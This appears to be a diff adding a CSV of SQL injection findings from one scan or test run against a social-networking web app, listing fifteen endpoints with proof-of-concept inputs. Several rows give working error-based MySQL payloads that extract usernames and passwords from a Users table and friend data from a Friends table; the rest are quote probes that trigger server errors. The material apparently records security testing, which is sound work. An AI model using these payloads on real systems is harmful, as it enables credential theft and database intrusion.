@@ -1,0 +1,16 @@
+run_id,endpoint,vulnerability,poc
+20260902-2028-0002,GET /profile?username=,SQL Injection,"`mr_robot' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /users?search=,SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /friends?search=,SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username1,0x3a,username2) FROM Friends),0x7e))-- `"
+20260902-2028-0002,GET /friends?username=,SQL Injection,"`mr_robot' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /direct_messages?username=,SQL Injection,`'` (HTTP 500 vs 200)
+20260902-2028-0002,GET /requests?username=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /create_post (content),SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- `"
+20260902-2028-0002,GET /edit_post?id=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /edit_post (id),SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,GET /delete_post?id=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /settings (name),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /settings (bio),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /request_friend (username),SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /remove_request (username),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /direct_messages (username),SQL Injection,`'` (HTTP 500)
